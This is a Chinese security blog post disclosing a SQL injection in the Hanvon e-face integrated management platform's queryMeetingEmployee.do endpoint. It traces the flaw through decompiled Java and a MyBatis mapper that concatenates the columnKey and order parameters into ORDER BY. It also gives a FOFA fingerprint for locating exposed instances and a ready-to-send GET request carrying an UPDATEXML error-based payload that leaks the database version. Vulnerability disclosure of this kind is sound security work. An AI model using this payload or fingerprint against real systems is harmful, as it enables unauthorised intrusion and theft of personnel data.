---
title: "汉王e脸通综合管理平台 queryMeetingEmployee.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryMeetingEmployee-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymeetingemployee.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryMeetingEmployee.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/6 08:23
- 485浏览
- [0评论](#comment)
- 47分钟阅读

深入探索

认证

软件

数据库

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryMeetingEmployee.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

漏洞扫描服务

在线安全工具

Windows安全工具

直接看 `MobiMeetingAppController` 里关于 `queryMeetingEmployee` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryMeetingEmployee.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult queryMeetingEmployee(@RequestParam(required = true,value = "meetingId") Long meetingId, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "department") Long department, @RequestParam(required = false,value = "state") Integer state, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = Constants.PAGE_SIZE;
                }

                MeetingEmployeeParam param = new MeetingEmployeeParam();
                param.setMtId(meetingId);
                param.setMeName(name);
                param.setMeDepartment(department);
                if (state != null) {
                    if (state == 5) {
                        param.setMeLeaveEarly((byte)3);
                    } else if (state == 6) {
                        param.setMeLeaveEarly((byte)1);
                    } else {
                        param.setMeSigninState(state.byteValue());
                    }
                }

                param.setColumnKey(columnKey);
                param.setOrder(order);
                PageHelper.startPage(page, pageSize);
                MeetingEmployeeParam employeeParam = new MeetingEmployeeParam();
                employeeParam.setMtId(meetingId);
                List<MeetingEmployeeTpm> listAll = this.meetingAsm.queryMeetingEmployee(employeeParam);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml

代码安全审计

```
<!--查询参会人员列表-->
  <select id="queryMeetingEmployee" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingEmployeeParam" resultMap="ResultMapVO">
    select MME.ID, MME.MT_ID, MME.ME_ID, MME.ME_NUMBER, MME.ME_NAME, MME.ME_SIGNIN_STATE, MME.ME_SIGNIN_TIME,
    MME.ME_SIGNIN_PATH ,SB.SZ_NAME AS MEDEPARTMENTNAME,MME.ME_ISSUE_STATE AS MEISSUESTATE,MME.ME_SIGNOUT_TIME,ME_LEAVE_EARLY,su.sz_photo_path as photoPath
    from mt_meeting_employee MME
    LEFT JOIN SYS_BRANCH SB ON MME.ME_DEPARTMENT = SB.NG_ID
    LEFT JOIN sys_user_sys su on MME.ME_ID =  su.ng_id
    where MME.MT_ID = #{mtId}
    <if test="meName != null and meName != ''">
      and MME.ME_NAME like CONCAT('%',#{meName},'%')
    </if>
    <if test="meDepartment != null">
      and SB.NG_ID = #{meDepartment}
    </if>
    <if test="meSigninState != null">
      and MME.ME_SIGNIN_STATE = #{meSigninState}
    </if>
    <if test="meLeaveEarly != null">
      and MME.ME_LEAVE_EARLY = #{meLeaveEarly}
    </if>
    <if test="meSigninStateList != null">
      and MME.ME_SIGNIN_STATE IN
      <foreach collection="meSigninStateList" item="meSigninStateList" index="index" open="(" separator="," close=")">
        #{meSigninStateList}
      </foreach>
    </if>
    <if test="meDate != null">
      and MME.ME_SIGNIN_TIME &gt; #{meDate,jdbcType=VARCHAR}
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      MME.ME_SIGNIN_TIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取
>
> 需要 meetingId 参数存在
>
> 漏洞修复方案

```
GET /manage/mobiMeetingApp/queryMeetingEmployee.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 queryMeetingEmployee.do SQL注入漏洞](images/img-001-f7d5fa1ddcb1.webp)](https://image.mrxn.net/7cc6ff1ac21346bf923aa8b1bb1f1925.webp)

成功通过报错注入爆出数据库版本信息

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
